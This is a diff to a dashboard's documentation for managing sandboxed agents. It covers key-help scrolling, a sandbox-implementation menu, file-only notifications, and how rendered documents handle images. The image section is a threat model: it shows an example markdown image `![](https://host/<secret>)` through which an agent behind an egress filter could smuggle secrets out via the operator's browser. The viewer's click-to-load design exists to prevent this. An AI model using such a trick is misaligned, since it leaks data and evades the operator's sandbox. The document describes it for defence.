@@ -71,6 +71,11 @@ r      refresh now (the list also polls every 2s)
 q      quit — this SHUTS DOWN the daemon (it asks first)
 ```
 
+The key help is longer than most terminals, so it scrolls: **↑/↓**, **PgUp**/
+**PgDn** and **Home**/**End** (or **k**/**j**, **^B**/**^F**, **g**/**G**) move
+through it, and any other key closes it as before. A terminal tall enough for
+the whole text says so instead of showing the scroll keys.
+
 ### Two kinds of row
 
 The list holds agents and, below them, this host's plain **sessions** — the
@@ -796,6 +801,16 @@ sandbox posture. While active, the item becomes **🔒 restore sandbox +
 restart**. The override is keyed to the stable agent identity, so `/clear` or
 reincarnation cannot lose it; a clone is a new agent and inherits the normal
 posture, not the temporary unlock.
+
+**🧩 sandbox implementation…** in the same menu is the opposite kind of action:
+it records which layer owns OS-level confinement for the agent's *next* launch,
+rather than restarting anything. That makes it offline-only — the item is
+disabled while the agent runs and its tooltip names the stop → assign → wake
+sequence. The picker lists each implementation with its description; the common
+use is moving an agent created before `resource-only` existed onto it, so its
+next launch gets a per-agent cgroup. The dialog reads the durable posture from
+the server, not from the row, because the row's sandbox fields describe the last
+launch. See [Sandboxing](sandboxing.md#moving-an-existing-agent-onto-it).
 
 If a human terminal is attached to the agent's tmux session, the restart parks
 that client on a short-lived bridge session and switches it onto the resumed
@@ -1551,7 +1566,12 @@ download card per published file. Up to 20 attached files arrive as separate
 downloads — so an image stays viewable instead of being buried in an archive —
 while a directory or a larger set is packaged as one zip. `--zip` and
 `--separate` force either shape, and `--name` (which renames a single download)
-implies `--zip`. Daemon-verified PNG, JPEG, GIF, WebP, and AVIF attachments also
+implies `--zip`. A notification that publishes a file may carry a subject and
+no body at all — the artifact is then the message. Where the body would be,
+the reader says so ("the attached file is the notification") rather than
+leaving a blank gap above the download card.
+
+Daemon-verified PNG, JPEG, GIF, WebP, and AVIF attachments also
 show a contain-fit thumbnail. Selecting the thumbnail opens the shared image
 preview overlay, which supports zoom, authenticated missing-file checks, and
 Escape-to-return while keeping the original download action available. SVG
@@ -1596,16 +1616,58 @@ become links at all — a relative or fragment target would resolve against the
 dashboard's own origin rather than the repository its author meant, so it keeps
 its text and loses the anchor.
 
-Images are **inline-only**: a `data:` raster URI renders, and every remote or
-relative `src` degrades to the image's alt text. An `<img>` is the one thing in
-a document that reaches the network without the operator clicking anything, and
-the document's author is an agent that may be running behind tclaude's own
-egress boundary (see [Linux network filtering](linux-network-filtering.md)). A
-remote `src` would let such an agent write `![](https://host/<secret>)` and have
-the operator's unfiltered browser make the request it could not — carrying data
-out around the sandbox the operator configured, and revealing that (and when)
-the report was opened. Suppressing the referrer would hide which host asked, not
-that the request happened, so the viewer does not make the request at all.
+A document can carry **images**, from three places, which the viewer does not
+treat alike.
+
+A self-contained `data:` raster URI renders on sight — it reaches nothing —
+but only for GIF, PNG, JPEG, and WebP. Any other `data:` image, AVIF included,
+is refused as a link target by markdown-it itself, which admits exactly those
+four, so the document shows the reference as written rather than the picture.
+An AVIF published as an attachment does render, so attach one rather than
+inlining it.
+
+A reference to a **file published with the same notification** renders too: an
+agent that runs `notify-human --attach report.md --attach chart.png` can write
+`![the chart](chart.png)` in the report and have the image appear in the
+document. The reference is matched against the published filenames — after
+percent-decoding, ignoring a leading `./`, ignoring case, and, if nothing
+matched, ignoring a trailing `?query` or `#fragment` — and resolves to that
+file's own authenticated download route on the daemon. Only files the daemon
+has confirmed are raster images (the same content-sniffed `previewable` verdict
+behind the attachment thumbnail, SVG excluded) can be referenced this way; a
+reference to anything else, or to a name nothing published, degrades to the
+image's alt text. So does a name that two published files both answer to —
+published twice under one name, or under names differing only in case or in
+percent-encoding — since it identifies neither, and showing one of them would
+be showing whichever happened to be attached first.
+
+A **remote `http(s)` image** is described rather than fetched. It renders as a
+placeholder carrying the alt text and the host, with a **Load image** button;
+the request happens when the operator clicks it, and not before. A document
+holding back more than one placeholder gets a single line above it offering to
+load them all; loading is by URL, so a document showing the same image twice
+resolves both from one click. Once loaded, the image is requested with
+`referrerpolicy="no-referrer"`.
+
+Only a target naming its own authority — `https://host/path` — counts as
+remote. `https:path` has a scheme but no `//`, and the browser resolves that
+against the dashboard's own base rather than as a remote address, so the host a
+placeholder named would not be the host contacted; such a target degrades to
+alt text with everything else.
+The reason for the click is that an `<img>` is the one thing in a document that
+reaches the network without the operator doing anything, and the document's
+author is an agent that may be running behind tclaude's own egress boundary
+(see [Linux network filtering](linux-network-filtering.md)). Rendered eagerly,
+such an agent could write `![](https://host/<secret>)` and have the operator's
+unfiltered browser make the request it could not — carrying data out around the
+sandbox the operator configured, and revealing that (and when) the report was
+opened. Suppressing the referrer would hide which host asked, not that the
+request happened, so the viewer makes no request the operator did not choose.
+
+Every other `src` — a relative name matching nothing published, an absolute
+path, a protocol-relative `//host/x`, a `data:` URI that is not a trusted
+raster type — degrades to the alt text, for the same reason the equivalent link
+targets lose their anchor.
 
 The daemon copies the bytes into its private data directory, so remote
 dashboards download through an authenticated route rather than receiving access to the agent's filesystem.
